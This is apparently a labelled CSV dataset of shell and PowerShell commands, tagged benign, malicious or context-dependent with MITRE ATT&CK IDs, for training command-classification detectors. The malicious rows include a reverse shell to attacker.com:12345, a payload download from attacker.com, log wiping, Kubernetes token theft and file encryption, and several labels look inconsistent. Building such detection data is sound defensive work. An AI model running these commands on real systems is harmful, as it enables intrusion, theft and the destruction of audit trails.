command,label,original_label,mitre_id
uvicorn --reload import.path:app_object,Benign,Benign,Benign
mixxx --debugAssertBreak --developer --loglevel trace,Benign,Benign,Benign
dpkg-deb [-b|--build] path/to/directory,Benign,Benign,Benign
find / -name httpd.conf -newer /etc/apache-perl/httpd.conf,Context_Dependent,Benign,Benign
"find /usr/ -path ""*local*""",Benign,Benign,Benign
ipaggcreate --address-pairs --bytes path/to/file.pcap,Benign,Benign,Benign
ppmtoacad [-d|-dxb] path/to/file.ppm > path/to/file.dxb,Benign,Benign,Benign
jenv enable-plugin plugin_name,Benign,Benign,Benign
lt [-p|--port] 8000 [-s|--subdomain] subdomain,Benign,Benign,Benign
apktool b path/to/directory,Benign,Benign,Benign
jdeps path/to/file.jar -dotoutput path/to/directory,Benign,Benign,Benign
subst,Benign,Benign,Benign
grub-editenv /boot/grub/grubenv list,Benign,Benign,Benign
nagios /etc/nagios/nagios.cfg,Benign,Benign,Benign
find . -iname .svn -exec bash -c 'rm -rf {}' \;,Benign,Benign,Benign
find /proc/$1/exe -printf '%l\n',Benign,Benign,Benign
dpkg -l | grep -i ssl,Context_Dependent,Synthetic,Synthetic
pct [ex|exec] 100 bash,Benign,Benign,Benign
"find ./js/ -type f -name ""*.js"" | xargs rm -f",Benign,Benign,Benign
mount.cifs -o user=username //server/share_name mountpoint,Context_Dependent,Benign,Benign
dirs,Benign,Benign,Benign
find var/ -type f -exec chmod 600 {} \;,Benign,Benign,Benign
gvedit -v path/to/graph.gv,Benign,Benign,Benign
find /path -type f -exec rm '{}' \;,Benign,Benign,Benign
pct [cr|create] 100 local:vztmpl/distro-name.tar.zst --rootfs local-lvm:4 --hostname hostname --password password,Benign,Benign,Benign
wal-telegram,Benign,Benign,Benign
tlmgr restore,Benign,Benign,Benign
lsix,Benign,Benign,Benign
istats cpu,Benign,Benign,Benign
git submodule set-url path/to/submodule new_url,Benign,Benign,Benign
Connect-AzureAD -Credential $Credential 2>&1> $null,Malicious,Malicious,T1110
rabbitmq-diagnostics log_tail --number n --node node,Benign,Benign,Benign
C:\log.txt,Malicious,Malicious,T1056
uv init --build-backend build_backend project_name,Benign,Benign,Benign
cmdkey /delete target_name,Benign,Benign,Benign
systemd-sysusers --cat-config,Benign,Benign,Benign
"$wc.DownloadFile($url, $imgLocation)",Malicious,Malicious,T1491
cargo [b|build] [-r|--release],Benign,Benign,Benign
sudo pivpn uninstall,Benign,Benign,Benign
read line,Benign,Benign,Benign
pio access list username,Benign,Benign,Benign
pkg [rei|reinstall] package,Benign,Benign,Benign
systemctl try-restart unit1 unit2 ...,Benign,Benign,Benign
jj config [p|path] --workspace,Benign,Benign,Benign
singularity pull --name image.sif library://godlovedc/funny/lolcow:latest,Benign,Benign,Benign
ufraw-batch --embedded-image input_file(s),Benign,Benign,Benign
"az sshkey create --name name [-g|--resource-group] resource_group --public-key ""@path/to/key.pub""",Benign,Benign,Benign
dphys-swapfile setup,Benign,Benign,Benign
find . -type f -exec grep -Iq . {} \; -and -print,Benign,Benign,Benign
GetUserSPNs.py domain/username:password -dc-ip domain_controller_ip -request,Benign,Benign,Benign
"xsv select column1,column2 path/to/file.csv",Benign,Benign,Benign
hunspell -d en_US path/to/file,Benign,Benign,Benign
docker run --name t1069_container --rm -d -t t1069,Context_Dependent,Malicious,T1069
Get-ADGroupMember,Context_Dependent,Malicious,T1087
"pamtogif [-c|-comment] ""Hello World!"" path/to/image.pam > path/to/output.gif",Benign,Benign,Benign
kwrite --line line_number --column column_number path/to/file,Benign,Benign,Benign
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));',Malicious,Malicious,T1140
pw useradd $username -s /usr/sbin/nologin -d /nonexistent -c evil_account,Malicious,Malicious,T1136
pulumi org,Benign,Benign,Benign
bcd.bat,Malicious,Malicious,T1059
find /home/*/public_html/ -type f \( -iwholename '*/libraries/joomla/version.php' -o -iwholename '*/libraries/cms/version.php' -o -iwholename '*/libraries/cms/version/version.php' \) -print0 -exec perl -e 'while (<>) { $release = $1 if m/ \$RELEASE\s+= .([\d.]+).;/; $dev = $1 if m/ \$DEV_LEVEL\s+= .(\d+).;/; } print qq( = $release.$dev\n);' {} \;,Context_Dependent,Benign,Benign
systemctl disable unit --now,Benign,Benign,Benign
find / \( -name 10_Recommended* -o -name share \) -prune -o -type f \( -name firefox -0 -name thunderbird -0 -name seamonkey \) -print 2>/dev/null,Context_Dependent,Benign,Benign
kodi-send --host 192.168.0.1 --port 9777 [-a|--action] Quit,Benign,Benign,Benign
hydra -L path/to/usernames.txt -P path/to/wordlist.txt -M path/to/hosts.txt -F pop3,Benign,Benign,Benign
tldr npm exec,Benign,Benign,Benign
spectacle [-i|--new-instance],Benign,Benign,Benign
resolveip [-s|--silent] example.org,Benign,Benign,Benign
waifu2x-ncnn-vulkan -i path/to/input_file -o path/to/output_file -s 1|2|4|8|16|32 -n -1|0|1|2|3,Benign,Benign,Benign
locust [-H|--host] http://example.com,Benign,Benign,Benign
"rgpt --max 300 --i ""$(git diff path/to/file)""",Benign,Benign,Benign
find /home -atime +7,Context_Dependent,Benign,Benign
mpstat 2,Benign,Benign,Benign
find . -name ‘*ITM*’,Benign,Benign,Benign
"cmstp /s ""path\to\profile_file""",Benign,Benign,Benign
find -iname '*weservice*'|xargs -I {} service {} restart,Benign,Benign,Benign
tail -50 /var/log/messages,Context_Dependent,Synthetic,Synthetic
xpdf path/to/file.pdf.tar,Benign,Benign,Benign
phpstan analyse path/to/directory [-a|--autoload-file] path/to/autoload_file,Benign,Benign,Benign
mpc stop,Benign,Benign,Benign
udiskie --config path/to/config.yml,Benign,Benign,Benign
git filter-branch --tree-filter 'rm [-rf|--recursive --force] folder' HEAD,Benign,Benign,Benign
"find . -name ""*.txt"" | python hello.py",Benign,Benign,Benign
ned --colors never '^[dl]og' .,Benign,Benign,Benign
share -F nfs -o rw /path/to/directory,Benign,Benign,Benign
serve [-s|--single],Benign,Benign,Benign
head -20 /etc/ssh/ssh_config,Context_Dependent,Synthetic,Synthetic
jdupes directory1 directory2 ...,Benign,Benign,Benign
tail -50 /var/log/dmesg,Context_Dependent,Synthetic,Synthetic
pnmnorm [-k|-keephues] path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
"find $HOME -not -iname ""*.c"" -print",Benign,Benign,Benign
fastlane run clear_derived_data,Benign,Benign,Benign
find . -name '*.py' | tee output.txt | xargs grep 'something',Benign,Benign,Benign
stress [-i|--io] 2 [-t|--timeout] 5,Benign,Benign,Benign
pulumi refresh --expect-no-changes,Benign,Benign,Benign
jhsdb jstack --pid pid,Benign,Benign,Benign
sudo usbip attach [-r|--remote] ip_address [-b|--busid] bus_id,Benign,Benign,Benign
paxs search_term,Benign,Benign,Benign
find / -size +600M -print,Context_Dependent,Benign,Benign
limactl create --name vm_name template://debian|fedora|ubuntu|...,Benign,Benign,Benign
speed-test,Benign,Benign,Benign
proxify [-of|-output-format] jsonl|yaml [-o|-output] path/to/file,Benign,Benign,Benign
__fnDWORD,Malicious,Malicious,T1574
Remove-EventLog -LogName Security,Malicious,Malicious,T1070
pacman -Rp package,Benign,Benign,Benign
"Add-Content -Path $ads_file -Value 'Write-Host ""Stream Data Executed""' -Stream 'streamCommand'",Malicious,Malicious,T1059
DYLD_FRAMEWORK_PATH,Malicious,Malicious,T1574
wikiman -S,Benign,Benign,Benign
ls -1tr * | tail -1,Benign,Benign,Benign
nodenv which command,Benign,Benign,Benign
find . ( -name '*.bak' -o -name *.backup ) -type f -atime +30 -exec rm '{}' ;,Benign,Benign,Benign
cosign dockerfile verify -key cosign.pub path/to/Dockerfile,Benign,Benign,Benign
find / -name local -type d,Context_Dependent,Benign,Benign
reg query key_name,Benign,Benign,Benign
lrzip [-b|--bzip2] path/to/file,Benign,Benign,Benign
shopt -s extglob find !(D) -name hi.dat,Benign,Benign,Benign
htop [-u|--user] username,Benign,Benign,Benign
"gow -e=go,html run .",Benign,Benign,Benign
"feroxbuster --url ""https://example.com"" --wordlist path/to/file --no-recursion --proxy ""http://127.0.0.1:8080""",Benign,Benign,Benign
gzip -d file.gz,Benign,Benign,Benign
/proc/<PID>/maps,Malicious,Malicious,T1003
md5sum *.java | awk '{print $1}' | sort | uniq -d,Benign,Benign,Benign
flash -i,Benign,Benign,Benign
ibmcloud config --color false,Benign,Benign,Benign
choco search query --local-only,Benign,Benign,Benign
"gifsicle [-b|--batch] --crop starting_x,starting_y+rect_widthxrect_height --scale 0.25 --flip-horizontal --rotate-90|180|270 path/to/input.gif",Benign,Benign,Benign
jf rt search --recursive repostiory_name/path/,Benign,Benign,Benign
Label,Malicious,Malicious,T1543
"pbmtextps [-du|-dump-ps] ""Hello World!"" > path/to/output.ps",Benign,Benign,Benign
rustup-init.sh --profile minimal|default|complete,Benign,Benign,Benign
find /folder/path/* -mmin +120 -delete,Benign,Benign,Benign
dmesg | grep -i memory,Benign,Benign,Benign
create_ap -n wlan0 access_point_ssid passphrase,Benign,Benign,Benign
find ~/ -type f -exec grep -H 'text-to-find-here' {} \;,Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5",Malicious,Malicious,T1559
adb shell getprop,Benign,Benign,Benign
reboot [-w|--wtmp-only],Benign,Benign,Benign
pacinfo --version,Benign,Benign,Benign
find -mtime +2,Benign,Benign,Benign
"ruby -e 'exec ""/bin/sh""'",Malicious,Malicious,T1059
tailscale file cp path/to/file hostname|ip:,Benign,Benign,Benign
veracrypt [-t|--text] [-c|--create] --random-source=/dev/urandom,Benign,Benign,Benign
sha384sum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
Import-Module AzureAD,Malicious,Malicious,T1098
babeld -D,Benign,Benign,Benign
screencapture -T seconds path/to/file.png,Benign,Benign,Benign
attrib path\to\directory,Benign,Benign,Benign
ptyxis [-d|--working-directory] path/to/directory --tab,Benign,Benign,Benign
git gc,Benign,Benign,Benign
sudo log erase --all,Malicious,Malicious,T1070
debuild --no-lintian,Benign,Benign,Benign
qsub -l walltime=1:2:3 script.sh,Benign,Benign,Benign
aws s3 mb s3://bucket_name --region region,Benign,Benign,Benign
sudo nethogs -t seconds,Benign,Benign,Benign
audtool playlist-advance,Benign,Benign,Benign
nxc mssql 192.168.178.2 [-u|--username] path/to/usernames.txt [-p|--password] path/to/passwords.txt,Benign,Benign,Benign
vnstati --top 10 --iface network_interface --output path/to/output.png,Benign,Benign,Benign
xml [el|elements] -d3 path/to/input.xml|URI,Benign,Benign,Benign
pastel pick,Benign,Benign,Benign
lscpu [-e|--extended] [-c|--offline],Context_Dependent,Benign,Benign
func start,Benign,Benign,Benign
xdg-settings set pdf-viewer.desktop,Benign,Benign,Benign
hddtemp [-u|--unit] C|F type:/dev/sdX,Benign,Benign,Benign
nemo --tabs path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
bioradtopgm path/to/file.pic,Benign,Benign,Benign
gh [ext|extension] install owner/repository,Benign,Benign,Benign
doppler secrets get secrets,Benign,Benign,Benign
pamditherbw [-a|-atkinson] [-r|-randomseed] 1337 path/to/image.pgm > path/to/file.pgm,Benign,Benign,Benign
dep deploy hostname,Benign,Benign,Benign
sudo iptables-restore path/to/file,Benign,Benign,Benign
pluginpath=/path/to/temp-dir/,Malicious,Malicious,T1548
sudo lastb,Benign,Benign,Benign
ansible-lint path/to/playbook_file path/to/role_directory,Benign,Benign,Benign
find / \! \( -newer ttt -user wnj \) -print,Context_Dependent,Benign,Benign
knock [-v|--verbose] hostname portnumber,Benign,Benign,Benign
ansible-test shell,Malicious,Malicious,T1059
npm completion >> ~/.bashrc,Benign,Benign,Benign
git ls-files [-o|--others],Benign,Benign,Benign
dropbearkey -y -f path/to/key_file,Benign,Benign,Benign
lsinitrd --unpack,Benign,Benign,Benign
jc pattern,Benign,Benign,Benign
GetVolumePathNamesForVolumeNameW(),Context_Dependent,Malicious,T1083
rsync $OPTS $FIND $BACKUPDIR,Benign,Benign,Benign
WriteProcessMemory(),Malicious,Malicious,T1574
autoexpect -f path/to/file command,Benign,Benign,Benign
sfdk device exec device-name-or-idx command,Benign,Benign,Benign
"reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f",Malicious,Malicious,T1078
zizmor --gh-token token username/repository,Benign,Benign,Benign
"find foldername -exec chmod a+rwx {} "";""",Context_Dependent,Benign,Benign
mysqlsh --user username --host hostname --port port,Benign,Benign,Benign
tree -d -L 1 -i --noreport,Benign,Benign,Benign
docker [rm|container rm] [-v|--volumes] container,Benign,Benign,Benign
cargo binstall package@version,Benign,Benign,Benign
<Alt a>,Benign,Benign,Benign
tldr rabbitmqctl cluster,Benign,Benign,Benign
"find . ! -name . -prune -name '*.old' -exec sh -c 'mv ""$@"" ../old/' sh {} +",Benign,Benign,Benign
Restart-Computer,Malicious,Malicious,T1547
find ./ -type f -newer /tmp/date.start ! -newer /tmp/date.end -exec rm {} \;,Benign,Benign,Benign
sudo lxc-create [-n|--name] container_name [-t|--template] download,Benign,Benign,Benign
timeout 20,Malicious,Malicious,T1497
aws logs delete-log-stream --log-group-name $cloudwatch_log_group_name --log-stream-name $cloudwatch_log_stream_name --region $region,Malicious,Malicious,T1562
mysqldump --user user --password --all-databases > path/to/file.sql,Benign,Benign,Benign
"echo hello world | tee >(awk '{print $2, $1}')",Benign,Benign,Benign
curl http://attacker.com/path/to/input-file -o /path/to/output-file,Malicious,Malicious,T1105
warp-cli help,Benign,Benign,Benign
pamixer [-m|--mute],Benign,Benign,Benign
pnpx module_name,Benign,Benign,Benign
yum check-update | awk 'p; /Updated packages/ {p=1}',Benign,Benign,Benign
etcdctl snapshot restore path/to/snapshot.db,Benign,Benign,Benign
bash-it search --enable|disable alias|plugin|completion,Benign,Benign,Benign
cd /nfs//office/ && find . -name '.user.log',Benign,Benign,Benign
pnmremap [-ma|-mapfile] path/to/palette_file.ppm [-m|-missingcolor] color path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
"git whatchanged --since ""2 hours ago""",Benign,Benign,Benign
find . -maxdepth 1 -type d,Benign,Benign,Benign
sudo apachectl graceful,Benign,Benign,Benign
find . -type d -regextype posix-egrep -regex '\./processor[[:digit:]]*/10\.(1|2)',Benign,Benign,Benign
ocamlfind -toolchain cross-toolchain ocamlopt -o path/to/executable path/to/source.ml,Benign,Benign,Benign
"t:connect(""attacker.com"",12345);",Malicious,Malicious,T1059
git commit [-m|--message] message_text,Benign,Benign,Benign
sudo vgs,Benign,Benign,Benign
kubectx,Benign,Benign,Benign
kdocker application,Benign,Benign,Benign
"finger | sed 's/\t/ /' | sed 's/pts\/[0-9]* *[0-9]*//' | awk '{print $2""\t(""$1"")\t""$3"" ""$4"" ""$5}' | sort | uniq",Context_Dependent,Benign,Benign
img2pdf path/to/image.ext --auto-orient --pagesize A4^T --border 2cm:5.1cm --output path/to/file.pdf,Benign,Benign,Benign
mongosh --host host --port port db_name,Benign,Benign,Benign
dnswalk -i domain.,Benign,Benign,Benign
sudo showkey [-k|--keycodes],Benign,Benign,Benign
antibody update,Benign,Benign,Benign
eglinfo -B,Benign,Benign,Benign
blurlock [-p|--pointer] default,Benign,Benign,Benign
sudo nixos-container run container_name -- command command_arguments,Benign,Benign,Benign
/lib/preload.so reboot newreboot 1,Malicious,Malicious,T1574
"find . -type f -execdir bash -c ' dest=${1//[0-9]/} [[ -f $dest ]] || cp -- ""$1"" ""$dest"" ' _ {} \;",Benign,Benign,Benign
find ./ -name '*.JPG' -type f | wc -l,Benign,Benign,Benign
csvstat data.csv,Benign,Benign,Benign
pdfcrop path/to/input_file.pdf --margins 'left top right bottom' path/to/output_file.pdf,Benign,Benign,Benign
su -c /bin/sh,Malicious,Malicious,T1059
find . -type f -mtime -14 > deploy.txt,Benign,Benign,Benign
unrar x compressed.rar path/to/extract,Benign,Benign,Benign
ssh user@server 'DISPLAY=:0 nohup xeyes < /dev/null > std.out 2> std.err &',Benign,Benign,Benign
"$storageAccountObjects | Export-Csv -Path ""$output_file"" -NoTypeInformation",Context_Dependent,Malicious,T1619
alacritty msg create-window,Benign,Benign,Benign
apm upgrade package,Benign,Benign,Benign
mosquitto [-c|--config-file] path/to/file.conf,Benign,Benign,Benign
slapt-src [-w|--show] slackbuild_name,Benign,Benign,Benign
aircrack-ng -w path/to/wordlist.txt path/to/capture.cap,Benign,Benign,Benign
"find MyApp.app -name Headers -type d -exec rm -rf ""{}"" \; 2>/dev/null",Benign,Benign,Benign
if (-Not (Test-Path -Path $folderPath)) {,Malicious,Malicious,T1105
wat2wasm file.wat [-o|--output] file.wasm,Benign,Benign,Benign
waymore -mode U [-oU|--output-urls] path/to/example.com-urls.txt [-i|--input] example.com,Benign,Benign,Benign
"oneliner [-c|--clipboard] ""compress all pdfs""",Benign,Benign,Benign
getent group | cut -d: -f1 | sort | cat -n,Context_Dependent,Benign,Benign
clang-format -i path/to/file,Benign,Benign,Benign
sqlite3 path/to/database.sqlite3 'SELECT * FROM some_table;',Benign,Benign,Benign
terragrunt apply,Benign,Benign,Benign
pw-cat [-p|--playback] path/to/file.wav,Benign,Benign,Benign
dmd -boundscheck=on|safeonly|off,Benign,Benign,Benign
pg_dumpall > path/to/file.sql,Benign,Benign,Benign
"{cmd /c copy ""$binary_file"" ""\\$machine\$remote_drive_letter$$exe_remote_folder""",Malicious,Malicious,T1105
readlink /proc/1234/exe,Context_Dependent,Synthetic,Synthetic
git filter-branch --env-filter 'GIT_AUTHOR_EMAIL=new_email' HEAD,Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 4",Malicious,Malicious,T1559
"nettop -p ""process_id|process_name""",Benign,Benign,Benign
dunst [-conf|-config] path/to/file,Benign,Benign,Benign
airshare --upload code,Benign,Benign,Benign
esxcli network diag ping,Context_Dependent,Malicious,T1018
claude prompt,Benign,Benign,Benign
"find . -name ""*$VERSION*""",Benign,Benign,Benign
basename /EBF/DirectiveFiles/data_report_PD_import_script_ABF1_6,Benign,Benign,Benign
"find / -type f -size +20000k -exec ls -lh {} \; 2> /dev/null | awk '{ print $NF "": "" $5 }' | sort -nrk 2,2",Context_Dependent,Benign,Benign
tldr shnsplit,Benign,Benign,Benign
dockdiver -url https://example.com -dump repository_name -port port -rate requests_per_second -dir path/to/output_directory,Benign,Benign,Benign
javadoc -d path/to/directory/ path/to/java_source_code,Benign,Benign,Benign
mcat path/to/file,Benign,Benign,Benign
free -b|k|m|g,Benign,Benign,Benign
picgo upload path/to/image,Benign,Benign,Benign
{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1},Malicious,Malicious,T1546
find / -writable ! -user $(whoami) 2>/dev/null,Context_Dependent,Synthetic,Synthetic
"foreach ($f in $dirsFilter) { if ($root -like ""*$f*"") { $match = $true; break } }",Context_Dependent,Malicious,T1083
sudo rc-service [-r|--resolve] service_name,Benign,Benign,Benign
mons -s,Benign,Benign,Benign
git bundle create path/to/file.bundle branch_name,Benign,Benign,Benign
ssh -L 1234:remote2:22 -p 45678 user1@remote1,Context_Dependent,Benign,Benign
"expr substr ""string"" from length",Benign,Benign,Benign
zcat biglogfile.gz | split -l500000 --filter='gzip > $FILE.gz',Benign,Benign,Benign
"command | cut [-d|--delimiter] ""delimiter"" [-f|--fields] 2-",Benign,Benign,Benign
scrot [-c|--count] [-d|--delay] 10,Benign,Benign,Benign
"find -regex ""$rx""",Benign,Benign,Benign
pnmtofiasco [-f|--config] path/to/fiascorc path/to/file.pnm > path/to/file.fiasco,Benign,Benign,Benign
mkcert -uninstall,Benign,Benign,Benign
command -1 <(gzip -dc file1.gz) -2 <(gzip -dc file2.gz),Benign,Benign,Benign
systemsetup -setsleep off -setrestartpowerfailure on -setrestartfreeze on,Benign,Benign,Benign
unix2mac [-i|--info] path/to/file,Benign,Benign,Benign
rawtoppm width height [-ro|-rowskip] m path/to/image.raw > path/to/output.ppm,Benign,Benign,Benign
sudo chown root process,Benign,Benign,Benign
ssh user@host -M -S /tmp/%r@%h:%p -N,Benign,Benign,Benign
gprof,Benign,Benign,Benign
"ps -o uid,pid,cmd|awk '{if($1==""username"" && $3==""your_command"") print $2}'|xargs kill -15",Context_Dependent,Benign,Benign
rcsdiff -c path/to/file,Benign,Benign,Benign
testssl example.com,Benign,Benign,Benign
"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""",Malicious,Malicious,T1105
aura [-As|--aursync --search] keyword|regex,Benign,Benign,Benign
head,Malicious,Malicious,T1140
"elvish -c ""echo 'elvish is executed'""",Benign,Benign,Benign
z -r string,Benign,Benign,Benign
git clean [-f|--force] -- path/to/directory '*.ext',Benign,Benign,Benign
"find -type f -printf ""%s %p\n"" | sort -nr | head -n 4 | awk ""{print $2}""",Benign,Benign,Benign
apptainer exec path/to/image.sif command arg1 arg2 ...,Benign,Benign,Benign
getST.py,Malicious,Malicious,T1558
libtool [l|link] gcc [-o|--output] path/to/library.lo path/to/source.lo,Benign,Benign,Benign
systemctl is-system-running --wait,Benign,Benign,Benign
coffee --compile path/to/file.coffee --output path/to/file.js,Benign,Benign,Benign
top -bn1,Context_Dependent,Synthetic,Synthetic
mdutil -i on|off path/to/volume,Benign,Benign,Benign
jj commit [-i|--interactive],Benign,Benign,Benign
ShellExecuteW,Malicious,Malicious,T1106
pammixinterlace path/to/image.ppm > path/to/output.ppm,Benign,Benign,Benign
$which_openssl rsautl -encrypt -inkey $public_key_path -pubin -in $input_file_path -out $encrypted_file_path,Malicious,Malicious,T1486
lci path/to/file,Benign,Benign,Benign
xmodmap -e 'keycode keycode =',Benign,Benign,Benign
repo-add path/to/database.db.tar.gz,Benign,Benign,Benign
$newModule.CodeModule.AddFromString($vbaCode),Malicious,Malicious,T1137
Get-DedupProperties -InputObject $(Get-Volume -DriveLetter 'E'),Benign,Benign,Benign
"find PDFs/ -name '*.pdf' -exec sh -c 'pdftotext ""{}"" - | grep -l -Z -i --label=""{}"" ""perry sound"" | xargs -0 -I{} grep -i -l --label=""{}"" ""October 26, 2004"" ""{}""' \;",Benign,Benign,Benign
git rebase [-X|--strategy-option] theirs branch_name,Benign,Benign,Benign
git bulk --removeworkspace workspace_name,Benign,Benign,Benign
massdns [-r|--resolvers] path/to/resolvers.txt path/to/domains.txt,Benign,Benign,Benign
softwareupdate --install update_name,Benign,Benign,Benign
stat /etc/shells,Context_Dependent,Synthetic,Synthetic
zipnote path/to/file.zip > path/to/file.txt,Benign,Benign,Benign
cryptsetup luksFormat /dev/sdXY path/to/keyfile,Benign,Benign,Benign
grep ds1337 /lib/modules/`uname -r`/modules.alias,Benign,Benign,Benign
poetry list,Benign,Benign,Benign
whereis gcc,Context_Dependent,Synthetic,Synthetic
pulumi whoami,Benign,Benign,Benign
ZwProtectVirtualMemory,Malicious,Malicious,T1106
sudo aa-update-browser -d path/to/profile,Benign,Benign,Benign
sudo mdadm --create /dev/md/MyRAID --level raid_level --raid-devices number_of_disks /dev/sdXN,Benign,Benign,Benign
keep-header path/to/file -- grep pattern,Benign,Benign,Benign
arjun -u https://example.com -o path/to/output.json,Benign,Benign,Benign
nomad job run path/to/file.nomad,Benign,Benign,Benign
"vibe --output json|text|streaming [-p|--prompt] ""your_prompt""",Benign,Benign,Benign
sudo [-u|--user] znc znc [-c|--makeconf] [-d|--datadir] /var/lib/znc,Benign,Benign,Benign
fc /c path\to\file1 path\to\file2,Benign,Benign,Benign
ZwSetValueKey(),Malicious,Malicious,T1543
tshark -Xlua_script:/path/to/temp-file,Malicious,Malicious,T1548
cups-config --version,Benign,Benign,Benign
nautilus --quit,Benign,Benign,Benign
psexec.py domain/username:password@target,Benign,Benign,Benign
curl -k $ip_lookup_url,Context_Dependent,Malicious,T1614
readlink /proc/1/exe,Context_Dependent,Synthetic,Synthetic
zola init my_site,Benign,Benign,Benign
find $YOUR_DIR -type f,Benign,Benign,Benign
curl -s icanhazip.com,Context_Dependent,Synthetic,Synthetic
aws sns create-topic --name name,Benign,Benign,Benign
New-Item $rclone_config_path\rclone -ItemType directory,Malicious,Malicious,T1567
caja path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
minifab install [-n|--chaincode-name] chaincode_name,Benign,Benign,Benign
gst-launch-1.0 pulsesrc device=@DEFAULT_MONITOR@ ! opusenc ! oggmux ! filesink location=path/to/file.ogg,Benign,Benign,Benign
cmake path/to/project_directory -D CMAKE_BUILD_TYPE=Release,Benign,Benign,Benign
zgrep [-E|--extended-regexp] regex path/to/file,Benign,Benign,Benign
"cal | awk 'NR>2{Sfields=7-NF; if (Sfields == 0 ) {printf ""%02d\n"",$3;exit}}'",Benign,Benign,Benign
shnsplit -f path/to/file.cue path/to/file.wav,Benign,Benign,Benign
"find /home/musicuser/Music/ -type f -iname ""*$1*"" -iname ""*$2*"" -exec mplayer {} \;",Context_Dependent,Benign,Benign
find . -name '*2011*' -print0 > /tmp/allfiles,Benign,Benign,Benign
7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so,Context_Dependent,Malicious,T1005
/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket,Malicious,Malicious,T1059
cpuid,Benign,Benign,Benign
"animdl stream ""anime_title"" [-s|--special] latest",Benign,Benign,Benign
twopi -T png -O path/to/input.gv,Benign,Benign,Benign
pdftk path/to/input.pdf cat 1-3 5 6-10 output path/to/output.pdf,Benign,Benign,Benign
redis-cli -h host -p port,Benign,Benign,Benign
find ./ -daystart -mtime -3 -type f ! -mtime -1 -printf '%TY %p\n',Benign,Benign,Benign
sudo lvscan --inactive,Benign,Benign,Benign
tldr pwd,Benign,Benign,Benign
find . -type f -name '*.zip' -print0 | xargs -0 tar -xzf,Benign,Benign,Benign
cargo fmt --check,Benign,Benign,Benign
find ./ -type d -size 0c -print | xargs rmdir,Benign,Benign,Benign
where command,Benign,Benign,Benign
bun pm pack --dry-run,Benign,Benign,Benign
marimo edit path/to/notebook.py,Benign,Benign,Benign
"find /Applications/ -name ""*.java"" -exec grep -i TODO {} +",Benign,Benign,Benign
tmsu tags *.mp3,Benign,Benign,Benign
~/Library/.DS_Stores/,Malicious,Malicious,T1564
nmap -sV 192.168.1.10,Context_Dependent,Synthetic,Synthetic
pbmtoescp2 [-re|-resolution] 180|360|720 path/to/image.pbm > path/to/output.escp2,Benign,Benign,Benign
"mount /mnt/mountpoint -oremount,rw",Context_Dependent,Benign,Benign
type lua,Context_Dependent,Synthetic,Synthetic
find . -type f -print0 | xargs -0 chmod go+r,Benign,Benign,Benign
file */* *>> $output_file,Context_Dependent,Malicious,T1083
tar -c --use-compress-program=pigz -f tar.file dir_to_zip,Benign,Benign,Benign
emacs --script path/to/file.el,Benign,Benign,Benign
look '' /path/to/input-file,Context_Dependent,Malicious,T1005
cam [-c|--camera] camera_index [-C|--capture] [-S|--sdl],Benign,Benign,Benign
kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token,Malicious,Malicious,T1552
kubectl get all [-A|--all-namespaces],Context_Dependent,Benign,Benign
info first_menu_item second_menu_item,Benign,Benign,Benign
aapt package -F path/to/app.apk path/to/directory,Benign,Benign,Benign
sudo ln -s /usr/lib/jvm/java-7-oracle /usr/lib/jvm/default-java,Benign,Benign,Benign
asciinema [r|record] [-i|--idle-time-limit] 2.5,Benign,Benign,Benign
offlineimap -o,Benign,Benign,Benign
whois -b 8.8.8.8,Benign,Benign,Benign
run-mailcap --action=print path/to/file,Benign,Benign,Benign
Ventoy2Disk VTOYCLI /I /Drive:D: /GPT /NOSB,Benign,Benign,Benign
